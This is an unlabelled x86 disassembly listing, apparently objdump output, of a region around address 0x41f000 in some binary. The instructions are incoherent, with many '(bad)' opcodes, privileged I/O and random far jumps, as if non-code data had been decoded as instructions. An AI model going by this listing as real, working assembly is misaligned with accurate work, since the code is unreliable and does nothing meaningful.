  41f091:	outs   dx,DWORD PTR ds:[esi]
  41f092:	test   eax,0x6575afe2
  41f097:	or     eax,0x50000889
  41f09c:	push   0x71
  41f09e:	mov    eax,0xec696cf8
  41f0a3:	mov    dh,0xa1
  41f0a5:	fsub   DWORD PTR [ebx]
  41f0a7:	scas   al,BYTE PTR es:[edi]
  41f0a8:	jl     0x41f03a
  41f0aa:	loope  0x41f0db
  41f0ac:	fdivr  QWORD PTR [esi+0x6e6116e7]
  41f0b2:	imul   BYTE PTR [edi-0x20963759]
  41f0b8:	add    ah,0xfc
  41f0bb:	dec    eax
  41f0bc:	mov    eax,ds:0x458b0565
  41f0c1:	das    
  41f0c2:	outs   dx,DWORD PTR ds:[esi]
  41f0c3:	sub    DWORD PTR ds:0xf22755f7,edx
  41f0c9:	sti    
  41f0ca:	mov    cl,0x84
  41f0cc:	scas   al,BYTE PTR es:[edi]
  41f0cd:	sub    eax,0x8ac0340f
  41f0d2:	cmp    DWORD PTR [ebx],esi
  41f0d4:	sbb    DWORD PTR [ecx-0x4],esi
  41f0d7:	shl    BYTE PTR [edi+edx*2+0x22],1
  41f0db:	stos   DWORD PTR es:[edi],eax
  41f0dc:	sar    esp,0x7d
  41f0df:	repnz lahf 
  41f0e1:	enter  0x2182,0xd7
  41f0e5:	ja     0x41f0d5
  41f0e7:	fcomp  DWORD PTR [ebp+0x19]
  41f0ea:	popf   
  41f0eb:	out    0xbf,al
  41f0ed:	or     BYTE PTR [edx-0x723ff31e],ch
  41f0f3:	cmp    DWORD PTR [edx],edx
  41f0f5:	das    
  41f0f6:	sub    DWORD PTR [edx-0x27],0x72
  41f0fa:	ret    
  41f0fb:	pusha  
  41f0fc:	sahf   
  41f0fd:	jp     0x41f12b
  41f0ff:	aas    
  41f100:	popf   
  41f101:	iret   
  41f102:	sub    DWORD PTR [edx-0x4],edx
  41f105:	cdq    
  41f106:	adc    al,0x74
  41f108:	mov    esp,0x8bfdcec1
  41f10d:	inc    ecx
  41f10e:	icebp  
  41f10f:	mov    ebp,0x80b881b3
  41f114:	and    al,0x1d
  41f116:	mov    al,0x82
  41f118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f119:	cmp    ch,BYTE PTR [esp+eax*2+0x2a3ed8f5]
  41f120:	in     eax,dx
  41f121:	mov    ebp,0x28cd44c8
  41f126:	mov    ah,0xda
  41f128:	scas   al,BYTE PTR es:[edi]
  41f129:	icebp  
  41f12a:	jae    0x41f188
  41f12c:	imul   ebx,DWORD PTR [ecx],0x55
  41f12f:	cld    
  41f130:	into   
  41f131:	fist   WORD PTR [edx]
  41f133:	xchg   edi,eax
  41f134:	adc    BYTE PTR ds:0xaa8eb80b,bl
  41f13a:	push   0x10
  41f13c:	or     DWORD PTR [ebp+0xedde13],eax
	...
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	stos   DWORD PTR es:[edi],eax
  41f1b5:	add    dh,BYTE PTR [edi-0x1a]
  41f1b8:	push   edi
  41f1ba:	mov    ebx,0xee13144f
  41f1bf:	mov    DWORD PTR [edi-0x38],edx
  41f1c2:	mov    edi,DWORD PTR [eax]
  41f1c4:	fisttp QWORD PTR [ebp+0x1]
  41f1c7:	add    ch,dh
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [edi+0x181edb8b],al
  41f1d1:	cs jns 0x41f1f3
  41f1d4:	and    eax,0x4e2db3fd
  41f1d9:	fnstcw WORD PTR ds:0x8c2889cb
  41f1df:	(bad)  
  41f1e0:	aaa    
  41f1e1:	cld    
  41f1e2:	loopne 0x41f1e9
  41f1e4:	mov    eax,ds:0xb52a1f
  41f1e9:	adc    BYTE PTR [ebx-0x1b5e6efb],0xc3
  41f1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f1:	mov    ch,0x12
  41f1f3:	jae    0x41f1ae
  41f1f5:	add    BYTE PTR [ecx+0x3712ad9f],al
  41f1fb:	dec    edi
  41f1fc:	mov    ah,0x6a
  41f1fe:	mov    ss,WORD PTR [ebp+0x2b]
  41f201:	addr16 stc 
  41f203:	dec    ebx
  41f204:	dec    ebp
  41f205:	fnsave [edi]
  41f207:	pop    ecx
  41f208:	xchg   ecx,eax
  41f209:	retf   
  41f20a:	add    ch,BYTE PTR [eax+ebx*8]
  41f20d:	xchg   DWORD PTR [edi+0x381cb76a],edx
  41f213:	xor    BYTE PTR [edi-0x18959c02],cl
  41f219:	xor    eax,0xaa7e250
  41f21e:	pop    es
  41f21f:	or     ah,BYTE PTR [eax+0x79]
  41f222:	icebp  
  41f223:	ins    BYTE PTR es:[edi],dx
  41f224:	cld    
  41f225:	adc    eax,0x42c143da
  41f22a:	add    bl,BYTE PTR [esi+edx*2]
  41f22d:	mov    esi,0x4be1bb39
  41f232:	mov    ch,0xdd
  41f234:	sub    esi,0x74f0d81
  41f23a:	fdivr  DWORD PTR es:[ebx+0x61e66af8]
  41f241:	rol    DWORD PTR [edx-0x11],0x82
  41f245:	lods   eax,DWORD PTR ds:[esi]
  41f246:	inc    ebx
  41f247:	adc    edi,DWORD PTR [esi+0x622d7537]
  41f24d:	ss mov bl,cl
  41f250:	dec    edx
  41f251:	into   
  41f252:	lea    eax,[ebp-0x10295066]
  41f258:	(bad)  
  41f259:	mov    DWORD PTR [ecx],0xfead3986
  41f25f:	rcr    BYTE PTR [ecx-0x3a6b088f],0xbe
  41f266:	clc    
  41f267:	mov    fs:0x645da57c,eax
  41f26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f26e:	mov    WORD PTR [edx],es
  41f270:	push   es
  41f271:	and    al,0xec
  41f273:	mov    ebp,0x76138ecd
  41f278:	pop    ebx
  41f279:	push   esp
  41f27a:	test   ebp,esp
  41f27c:	xchg   ecx,eax
  41f27d:	js     0x41f23b
  41f27f:	nop
  41f280:	xor    al,0x8c
  41f282:	adc    DWORD PTR [edi+0x607775c4],eax
  41f288:	push   es
  41f289:	adc    esi,DWORD PTR [edi+0x602cb708]
  41f28f:	or     ah,cl
  41f291:	add    eax,0xe3d24f48
  41f296:	sub    eax,0x9f03402d
  41f29b:	(bad)  [ebx+ebp*4+0x14]
  41f29f:	in     eax,0xbc
  41f2a1:	push   ebx
  41f2a2:	std    
  41f2a3:	push   ds
  41f2a4:	mov    bl,0x90
  41f2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2a7:	xchg   edx,eax
  41f2a8:	call   0x2adc8651
  41f2ad:	fdivr  DWORD PTR [ebp+0x1b8a33bc]
  41f2b3:	aas    
  41f2b4:	(bad)  
  41f2b5:	(bad)  
  41f2b6:	xchg   edi,eax
  41f2b7:	cmp    DWORD PTR [edi+0x5bfb7678],edi
  41f2bd:	das    
  41f2be:	and    al,0x7a
  41f2c0:	inc    esi
	...
  41f331:	add    BYTE PTR [eax],al
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x1eb1:0xd39531a0
  41f343:	adc    dl,0x4e
  41f346:	add    DWORD PTR [eax],eax
  41f348:	cmc    
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [ebp+0x21],ah
  41f34e:	sub    dl,BYTE PTR [eax+edx*4-0x1bfee853]
  41f355:	mov    cl,0x8c
  41f357:	call   0xde87ff08
  41f35c:	lahf   
  41f35d:	into   
  41f35e:	out    dx,al
  41f35f:	inc    edx
  41f360:	and    edi,DWORD PTR [esi]
  41f362:	(bad)  
  41f363:	es jmp 0x72f2:0x6c13ab31
  41f36b:	cmp    DWORD PTR [ecx+0xe],edi
  41f36e:	xchg   ebx,eax
  41f36f:	icebp  
  41f370:	dec    ecx
  41f371:	push   ecx
  41f372:	pop    eax
  41f373:	popa   
  41f374:	push   esp
  41f375:	ins    DWORD PTR es:[edi],dx
  41f376:	std    
  41f377:	pop    ds
  41f378:	(bad)  
  41f379:	rcl    bh,1
  41f37b:	push   ebx
  41f37c:	mov    DWORD PTR [esi+0x6],esi
  41f37f:	dec    edi
  41f380:	xchg   ebp,eax
  41f381:	xchg   BYTE PTR [ebx],dh
  41f383:	xor    DWORD PTR [edx-0x1f],0x4deca04
  41f38a:	and    al,0xfe
  41f38c:	mov    ?,WORD PTR [edx+0x54]
  41f38f:	dec    edi
  41f390:	lods   eax,DWORD PTR ds:[esi]
  41f391:	jle    0x41f338
  41f393:	mov    ds:0x50fead2c,eax
  41f398:	in     al,dx
  41f399:	lea    ebp,[edi+esi*8]
  41f39c:	and    al,0x93
  41f39f:	jecxz  0x41f3db
  41f3a1:	jnp    0x41f3a0
  41f3a3:	(bad)  
  41f3a4:	push   esi
  41f3a5:	ins    DWORD PTR es:[edi],dx
  41f3a6:	sub    al,0x70
  41f3a8:	push   edi
  41f3a9:	(bad)  
  41f3aa:	retf   
  41f3ab:	dec    ebx
  41f3ac:	dec    esp
  41f3ad:	or     DWORD PTR [ebx-0x34],esp
  41f3b0:	test   al,0x2f
  41f3b2:	xchg   DWORD PTR [ebp-0x5fb94d72],ecx
  41f3b8:	push   ecx
  41f3b9:	mov    dl,BYTE PTR [eax+0x72]
  41f3bc:	leave  
  41f3bd:	add    BYTE PTR [ecx+0x2865770a],bh
  41f3c3:	gs inc ebp
  41f3c5:	cmpxchg DWORD PTR [esi-0x1e85b4c],edi
  41f3cc:	fwait
  41f3cd:	dec    esp
  41f3ce:	sub    bh,al
  41f3d0:	sti    
  41f3d1:	out    0x91,eax
  41f3d3:	ret    0xd35a
  41f3d6:	and    al,0x7b
  41f3d8:	add    eax,0xa2cfd1df
  41f3dd:	adc    cl,BYTE PTR [edi+eax*4-0x15]
  41f3e1:	(bad)  [ecx+0x61575540]
  41f3e7:	(bad)  
  41f3e8:	fs call 0xe567:0x75267e9
  41f3f0:	test   eax,0x14928d42
  41f3f5:	xor    eax,0xdb744185
  41f3fa:	add    DWORD PTR [eax+0x121dbb3c],esp
  41f400:	pop    ss
  41f401:	stos   DWORD PTR es:[edi],eax
  41f402:	mov    WORD PTR [ecx],fs
  41f404:	(bad)
  41f407:	xchg   ecx,eax
  41f408:	or     al,0x5a
  41f40a:	or     dl,BYTE PTR [edi]
  41f40c:	(bad)  
  41f40e:	imul   edi,DWORD PTR [esi],0x26
  41f411:	xchg   BYTE PTR [edx+0x48],dl
  41f414:	into   
  41f415:	sub    DWORD PTR [ebx+edi*2+0x21],ebp
  41f419:	pushf  
  41f41a:	push   0xa65ac22e
  41f41f:	sbb    eax,0xc76b592a
  41f424:	mov    esp,0x7759e749
  41f429:	mov    bh,0x75
  41f42b:	pop    es
  41f42c:	mov    al,ds:0xdadbd03b
  41f431:	aaa    
  41f432:	rcr    BYTE PTR [ecx],0x52
  41f435:	rol    BYTE PTR [edi],cl
  41f437:	fmul   st(6),st
  41f439:	fnsave ds:0xae50a33
  41f43f:	es xchg edx,eax
	...
  41f4b1:	add    BYTE PTR [eax],al
  41f4b3:	add    BYTE PTR [eax],ah
  41f4b5:	push   0xffffffcb
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x5
  41f4c1:	out    dx,al
  41f4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c3:	pop    edi
  41f4c5:	dec    edi
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	cmc    
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [edx-0x27],dh
  41f4ce:	test   al,0x29
  41f4d0:	test   eax,0xf3472b33
  41f4d5:	test   BYTE PTR [edi],bl
  41f4d7:	jle    0x41f53c
  41f4d9:	mov    eax,cs
  41f4db:	cwde   
  41f4dc:	xchg   esp,eax
  41f4dd:	inc    edi
  41f4de:	ret    
  41f4df:	stos   BYTE PTR es:[edi],al
  41f4e0:	in     al,dx
  41f4e1:	cmp    al,0x9e
  41f4e3:	(bad)  
  41f4e5:	shl    BYTE PTR [eax+0x4e],1
  41f4e8:	pusha  
  41f4e9:	mov    ch,0xbf
  41f4eb:	(bad)
  41f4ee:	xor    DWORD PTR [edx-0x568fa440],0xffffffd7
  41f4f5:	in     al,0x4d
  41f4f7:	cmp    al,0x87
  41f4f9:	and    BYTE PTR [esi+ebp*1],bh
  41f4fc:	hlt    
  41f4fd:	daa    
  41f4fe:	(bad)  
  41f500:	or     ch,bh
  41f502:	fmul   st(6),st
  41f504:	adc    DWORD PTR [ecx],edx
  41f506:	fisub  DWORD PTR [eax-0x1df215c]
  41f50c:	das    
  41f50d:	loope  0x41f4cd
  41f50f:	push   cs
  41f510:	adc    DWORD PTR [edi-0x49],edi
  41f513:	or     eax,0xee0605ae
  41f518:	jp     0x41f4cb
  41f51a:	leave  
  41f51b:	jl     0x41f514
  41f51d:	add    BYTE PTR [edi],0x6f
  41f520:	ins    BYTE PTR es:[edi],dx
  41f521:	inc    edi
  41f522:	aas    
  41f523:	add    esp,DWORD PTR [ecx-0x68]
  41f526:	fwait
  41f527:	outs   dx,BYTE PTR ds:[esi]
  41f528:	loopne 0x41f533
  41f52a:	dec    esi
  41f52b:	push   ebp
  41f52c:	add    DWORD PTR [eax+edi*2],ecx
  41f52f:	or     cl,BYTE PTR [edi+0x2c9c8e91]
  41f535:	sbb    eax,edx
  41f537:	push   ss
  41f538:	lods   al,BYTE PTR ds:[esi]
  41f539:	jbe    0x41f593
  41f53b:	xchg   BYTE PTR [esi+0x44],bh
  41f53e:	pop    eax
  41f53f:	shl    BYTE PTR [ebx],1
  41f541:	xchg   ebp,eax
  41f542:	mov    eax,0x46252c77
  41f547:	dec    edx
  41f548:	inc    ebx
  41f549:	xchg   DWORD PTR [eax],ecx
  41f54b:	lods   eax,DWORD PTR ds:[esi]
  41f54c:	mov    cl,0x15
  41f54e:	inc    ebx
  41f54f:	add    DWORD PTR [ebp-0x49],0x6a
  41f553:	(bad)  
  41f554:	fmul   DWORD PTR [edx-0x29a5c593]
  41f55a:	and    al,0x91
  41f55c:	nop
  41f55d:	(bad)  
  41f55e:	adc    BYTE PTR [edi-0x7a5ecd25],dl
  41f564:	arpl   WORD PTR [ecx-0x48],bx
  41f567:	jne    0x41f5e6
  41f569:	inc    esi
  41f56a:	imul   eax,DWORD PTR [esi+ecx*2-0x36],0x6f
  41f56f:	(bad)  
  41f570:	out    dx,eax
  41f571:	sbb    al,0x62
  41f573:	jae    0x41f552
  41f575:	fcmovne st,st(1)
  41f577:	jl     0x41f506
  41f579:	inc    esi
  41f57a:	adc    bl,ch
  41f57c:	lea    edi,[esp+ebp*2]
  41f57f:	gs cmp al,0xf0
  41f582:	mov    edi,0x79180006
  41f587:	aad    0x29
  41f589:	ror    DWORD PTR [edx-0x2d0ba3fb],cl
  41f58f:	ins    DWORD PTR es:[edi],dx
  41f590:	or     DWORD PTR [eax-0x6a],edi
  41f593:	imul   ebp,esp,0xffffffa1
  41f596:	push   edi
  41f597:	les    esi,FWORD PTR [edi]
  41f599:	cmp    edi,ebp
  41f59b:	loopne 0x41f520
  41f59d:	mov    eax,0x67e776d0
  41f5a2:	jmp    0xb17b:0x37c93b25
  41f5a9:	inc    esi
  41f5aa:	jmp    0x8d6b:0x4d706e36
  41f5b1:	mov    ?,WORD PTR [edi+0x316e322e]
  41f5b7:	or     BYTE PTR [ebx],0x29
  41f5ba:	or     BYTE PTR [edi-0x40],0xd1
  41f5be:	push   dx
  41f5c0:	mov    ds:0x0,al
	...
  41f631:	add    BYTE PTR [eax],al
  41f633:	add    ch,al
  41f635:	cwde   
  41f636:	loope  0x41f68d
  41f638:	std    
  41f639:	jge    0x41f630
  41f63b:	cwde   
  41f63c:	and    eax,0x3501e835
  41f641:	jns    0x41f64a
  41f643:	jnp    0x41f601
  41f645:	push   eax
  41f646:	add    DWORD PTR [eax],eax
  41f648:	cmc    
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    cl,cl
  41f64d:	pusha  
  41f64e:	inc    ebx
  41f64f:	mov    eax,ds:0xeeb8bf31
  41f654:	jb     0x41f62e
  41f656:	mov    cl,0x7c
  41f658:	dec    ecx
  41f659:	or     al,0x71
  41f65b:	mov    ds:0xa86b8f9e,eax
  41f660:	ins    BYTE PTR es:[edi],dx
  41f661:	dec    edx
  41f662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f664:	mov    ebp,0x21439f67
  41f669:	push   eax
  41f66a:	lock xchg esp,eax
  41f66c:	(bad)
  41f670:	mov    bh,BYTE PTR [edi-0x66]
  41f673:	dec    esi
  41f674:	cvtdq2ps xmm6,XMMWORD PTR [edx]
  41f677:	fmul   QWORD PTR [edx+0x12]
  41f67a:	adc    dl,ah
  41f67c:	add    BYTE PTR [ebx-0x7c],bh
  41f67f:	xor    esi,DWORD PTR [edi]
  41f681:	stc    
  41f682:	ja     0x41f6ce
  41f684:	inc    esp
  41f685:	inc    ebx
  41f686:	sub    eax,0xcba0daca
  41f68b:	mov    dl,0xc1
  41f68d:	(bad)  
  41f68e:	push   ebp
  41f68f:	dec    DWORD PTR ds:0xa36126cb
  41f695:	jmp    0xfae9774b
  41f69a:	mov    esp,0x89991905
  41f69f:	test   al,0x27
  41f6a1:	mov    ch,0x2a
  41f6a3:	gs sbb al,0x7a
  41f6a6:	lahf   
  41f6a7:	call   0xa2dd:0x1371d015
  41f6ae:	ja     0x41f671
  41f6b0:	mov    ah,0x24
  41f6b2:	or     esp,DWORD PTR [eax+0x3216aae4]
  41f6b8:	or     edx,edx
  41f6ba:	arpl   bx,bx
  41f6bc:	xor    esi,0xa18caf18
  41f6c2:	add    DWORD PTR [esi+edx*1+0x27],esi
  41f6c6:	ins    DWORD PTR es:[edi],dx
  41f6c7:	nop
  41f6c8:	adc    BYTE PTR [esi],ch
  41f6ca:	mov    ds:0xb0c302c1,eax
  41f6cf:	pop    esp
  41f6d0:	stc    
  41f6d1:	sahf   
  41f6d2:	mov    BYTE PTR ds:0x114e581,bl
  41f6d8:	out    dx,al
  41f6d9:	push   ebp
  41f6da:	loopne 0x41f725
  41f6dc:	mov    eax,ds:0xdc4ffdfc
  41f6e1:	gs js  0x41f6c3
  41f6e4:	jp     0x41f6e0
  41f6e6:	jae    0x41f6f5
  41f6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6e9:	jae    0x41f747
  41f6eb:	scas   al,BYTE PTR es:[edi]
  41f6ec:	shl    BYTE PTR ds:0x8803e3c8,1
  41f6f2:	sti    
  41f6f3:	push   ebx
  41f6f4:	test   dl,dh
  41f6f6:	sti    
  41f6f7:	aas    
  41f6f8:	out    0x3f,al
  41f6fa:	neg    al
  41f6fc:	inc    esp
  41f6fd:	and    ecx,DWORD PTR [esi-0x7f94583b]
  41f703:	outs   dx,DWORD PTR ds:[esi]
  41f704:	pop    ecx
  41f705:	and    bh,BYTE PTR [ecx+eax*8-0x11b76a80]
  41f70c:	adc    DWORD PTR [eax],0x5
  41f70f:	sbb    DWORD PTR [edx+0x18],edi
  41f712:	aaa    
  41f713:	mov    cl,0xf6
  41f715:	ret    
  41f716:	mov    edx,0xe36ce7ef
  41f71b:	pop    ecx
  41f71d:	(bad)  ds:0x58c43077
  41f723:	ss lock out dx,al
  41f726:	bound  ebx,QWORD PTR [edx-0x6e]
  41f729:	mov    ?,WORD PTR [edx]
  41f72b:	std    
  41f72c:	ret    
  41f72d:	jne    0x41f6be
  41f72f:	test   al,0x91
  41f731:	stc    
  41f732:	dec    eax
  41f733:	out    dx,eax
  41f734:	fldenv [edi]
  41f736:	sbb    al,0x6
  41f738:	dec    ebx
  41f739:	rcr    dl,cl
  41f73b:	push   ds
  41f73c:	loop   0x41f725
  41f73e:	int    0x26
  41f740:	jmp    0x41f742
	...
  41f7b2:	add    BYTE PTR [eax],al
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	push   ebp
  41f7c1:	scas   al,BYTE PTR es:[edi]
  41f7c2:	jae    0x41f762
  41f7c4:	mov    cl,0x51
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [ecx],dl
  41f7cd:	adc    ecx,ebx
  41f7cf:	adc    dl,BYTE PTR [edi-0x3c360fde]
  41f7d5:	xor    eax,DWORD PTR [edi-0x14]
  41f7d8:	or     ebp,esp
  41f7da:	sub    ch,BYTE PTR [ebp+0x7a]
  41f7dd:	rcl    DWORD PTR [ecx-0x2572f403],cl
  41f7e3:	push   ebp
  41f7e4:	nop
  41f7e5:	jb     0x41f792
  41f7e7:	mov    eax,0x4998edcb
  41f7ec:	mov    ah,0x96
  41f7ee:	scas   eax,DWORD PTR es:[edi]
  41f7ef:	out    0x83,al
  41f7f1:	xor    ch,ch
  41f7f3:	sbb    dl,bh
  41f7f5:	sar    BYTE PTR [ebx-0x7dd3c508],cl
  41f7fb:	jae    0x41f7db
  41f7fd:	dec    edi
  41f7fe:	aaa    
  41f7ff:	scas   al,BYTE PTR es:[edi]
  41f800:	mov    al,ds:0x1673651b
  41f805:	mov    dl,0xc9
  41f807:	aas    
  41f808:	fiadd  WORD PTR ds:0x9be81d06
  41f80e:	push   edi
  41f80f:	les    ebp,FWORD PTR [ebx+0x55]
  41f812:	or     BYTE PTR [eax+ecx*8-0x25],dh
  41f816:	lds    esi,FWORD PTR [edx]
  41f818:	xor    BYTE PTR [esi],ah
  41f81a:	ds push ss
  41f81c:	xchg   ecx,eax
  41f81d:	int    0x8b
  41f81f:	test   DWORD PTR [edx],edi
  41f821:	out    0x9a,al
  41f823:	stc    
  41f824:	mov    ds:0xb9dcfed4,eax
  41f829:	push   ebx
  41f82a:	test   al,0x42
  41f82c:	sbb    BYTE PTR [ebp-0x681ac6fe],bh
  41f832:	test   DWORD PTR [ebp-0x66],ecx
  41f835:	sub    edx,DWORD PTR [ebp-0x541b1781]
  41f83b:	mov    dl,0xdf
  41f83d:	dec    esi
  41f83e:	test   BYTE PTR [ebp-0x35f8a3df],ah
  41f844:	(bad)  
  41f845:	push   edx
  41f846:	cmc    
  41f847:	leave  
  41f848:	push   es
  41f849:	jne    0x41f7f1
  41f84b:	out    dx,al
  41f84c:	jns    0x41f859
  41f84e:	ret    
  41f84f:	popa   
  41f850:	fsubr  st(4),st
  41f852:	out    0x80,al
  41f854:	pop    esi
  41f855:	in     al,dx
  41f856:	mov    ah,cl
  41f858:	popa   
  41f859:	push   ds
  41f85a:	std    
  41f85b:	fcomp  QWORD PTR [ecx-0x12]
  41f85e:	cmp    esi,DWORD PTR [ecx+0x16]
  41f861:	inc    edx
  41f862:	xor    ebx,eax
  41f864:	pop    edx
  41f865:	mov    eax,ds:0xc5b5eb41
  41f86a:	nop
  41f86b:	sub    eax,0x8304b47d
  41f870:	int    0xca
  41f872:	jge    0x41f8c0
  41f874:	inc    edx
  41f875:	adc    eax,0xb7d2c6f
  41f87a:	loope  0x41f810
  41f87c:	and    esp,edi
  41f87e:	add    dl,al
  41f880:	dec    BYTE PTR [ebx+0x78]
  41f883:	mov    ah,0x3b
  41f885:	or     DWORD PTR [ebp+edx*8-0x38],ecx
  41f889:	push   ecx
  41f88a:	sub    edx,DWORD PTR [ecx+0xe]
  41f88d:	cmp    al,0xe3
  41f88f:	mov    eax,0x4fc67b50
  41f894:	push   ebp
  41f895:	cmc    
  41f896:	sbb    BYTE PTR [ecx-0x27efe73f],dl
  41f89c:	lea    edx,[eax-0x6f0f31d]
  41f8a2:	in     al,dx
  41f8a3:	or     eax,0x329a148f
  41f8a8:	jmp    0xb7da0d5d
  41f8ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ae:	jnp    0x41f8b3
  41f8b0:	xchg   BYTE PTR [edx+0xa],bl
  41f8b3:	mov    edx,0xfdf51dd3
  41f8b8:	xlat   BYTE PTR ds:[ebx]
  41f8b9:	cdq    
  41f8ba:	es stos DWORD PTR es:[edi],eax
  41f8bc:	aam    0x3a
  41f8be:	mov    ss,WORD PTR [esi+0x43]
	...
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x6d9ffef7
  41f941:	rol    DWORD PTR [edi],0x3b
  41f944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f945:	push   edx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [ecx-0x27d69ba2],dl
  41f951:	iret   
  41f952:	ss std 
  41f954:	adc    DWORD PTR [eax],ebp
  41f956:	add    edx,edi
  41f958:	sub    edi,DWORD PTR [ecx-0x5833c3ba]
  41f95e:	sar    DWORD PTR [edx-0x48c7de2f],cl
  41f964:	cwde   
  41f965:	gs dec esp
  41f967:	mov    ecx,0x6f5c3551
  41f96c:	rcl    DWORD PTR [esi+0x3d],1
  41f96f:	mov    al,ds:0x26be7b97
  41f974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f975:	sub    DWORD PTR [ebx],0xd10ca0bc
  41f97b:	fdivr  DWORD PTR [ebp-0x51]
  41f97e:	out    0x46,eax
  41f980:	push   0x50bb690e
  41f985:	push   edx
  41f986:	mov    ebx,0x5318cbb5
  41f98b:	scas   al,BYTE PTR es:[edi]
  41f98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f98d:	push   ds
  41f98e:	or     DWORD PTR [eax-0x4359d5f4],0xffffff89
  41f995:	pop    ss
  41f996:	xor    ebp,0xffffffbe
  41f999:	out    0xd,al
  41f99b:	jmp    0x6e93:0x8e107422
  41f9a2:	and    bl,BYTE PTR [esp+esi*1]
  41f9a5:	jge    0x41f986
  41f9a7:	add    ebp,eax
  41f9a9:	test   edi,edx
  41f9ab:	push   esi
  41f9ac:	test   BYTE PTR [edi+ecx*1-0x69],dl
  41f9b0:	nop
  41f9b1:	scas   eax,DWORD PTR es:[edi]
  41f9b2:	xchg   esi,eax
  41f9b3:	dec    edi
  41f9b4:	ret    
  41f9b5:	add    DWORD PTR [eax],esi
  41f9b7:	sub    bh,BYTE PTR [edx+0x25]
  41f9ba:	inc    edx
  41f9bb:	cmp    eax,0x38c83685
  41f9c0:	out    0x63,eax
  41f9c2:	and    al,0x0
  41f9c4:	cmp    al,0x35
  41f9c6:	mov    cl,0x2b
  41f9c8:	dec    edi
  41f9c9:	cld    
  41f9ca:	or     bh,ah
  41f9cc:	inc    edx
  41f9cd:	mov    dh,0x4d
  41f9cf:	ret    
  41f9d0:	jmp    0xb867:0xccc07aac
  41f9d7:	out    0xc8,eax
  41f9d9:	ins    BYTE PTR es:[edi],dx
  41f9da:	call   0xe741:0x1eb0af42
  41f9e1:	sbb    BYTE PTR [ebp+0x4cdc0e1c],0xbd
  41f9e8:	ins    BYTE PTR es:[edi],dx
  41f9e9:	ds stc 
  41f9eb:	les    eax,FWORD PTR [ecx+0x7b016d91]
  41f9f1:	add    al,0x68
  41f9f3:	sti    
  41f9f4:	xchg   esp,eax
  41f9f5:	rcr    DWORD PTR [ecx],1
  41f9f7:	push   0x7c
  41f9f9:	cmp    eax,0x8536ce7
  41f9fe:	test   edi,edi
  41fa00:	sub    BYTE PTR [ebp-0x34],al
  41fa03:	or     ch,BYTE PTR [edi-0x6a]
  41fa06:	mov    ?,esp
  41fa08:	add    edi,ebx
  41fa0a:	ins    DWORD PTR es:[edi],dx
  41fa0b:	fistp  QWORD PTR [eax-0x1b210dc3]
  41fa11:	xlat   BYTE PTR ds:[ebx]
  41fa12:	xor    ch,BYTE PTR [eax+0x28106312]
  41fa18:	ds (bad) 
  41fa1a:	push   ebx
  41fa1b:	fyl2x  
  41fa1d:	jmp    0xe2d83d3a
  41fa22:	pop    ecx
  41fa23:	sbb    bh,ah
  41fa25:	dec    ebx
  41fa26:	paddw  mm4,QWORD PTR gs:[edx-0x657c23d2]
  41fa2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa2f:	hlt    
  41fa30:	nop
  41fa31:	sub    al,0x3
  41fa33:	or     al,0x32
  41fa35:	cmc    
  41fa36:	adc    eax,0x7aa3ff8
  41fa3b:	jecxz  0x41fab5
  41fa3d:	inc    ecx
  41fa3e:	int3   
  41fa3f:	or     bl,BYTE PTR [ebp+0x0]
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	add    eax,0x9b1f7df1
  41fac5:	push   ebx
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	cmc    
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    BYTE PTR [ebp+0x30],cl
  41face:	out    dx,eax
  41facf:	fstp   DWORD PTR [ebp+0x67]
  41fad2:	adc    edx,DWORD PTR [ecx]
  41fad4:	dec    eax
  41fad5:	into   
  41fad6:	fwait
  41fad7:	pop    eax
  41fad8:	inc    edx
  41fad9:	xrelease xchg BYTE PTR [edi],dh
  41fadc:	and    DWORD PTR [eax+0x7f334d43],eax
  41fae2:	xlat   BYTE PTR ds:[ebx]
  41fae3:	repz xor eax,DWORD PTR [ebp-0x4e18ea2d]
  41faea:	psubsb mm1,mm1
  41faed:	ins    BYTE PTR es:[edi],dx
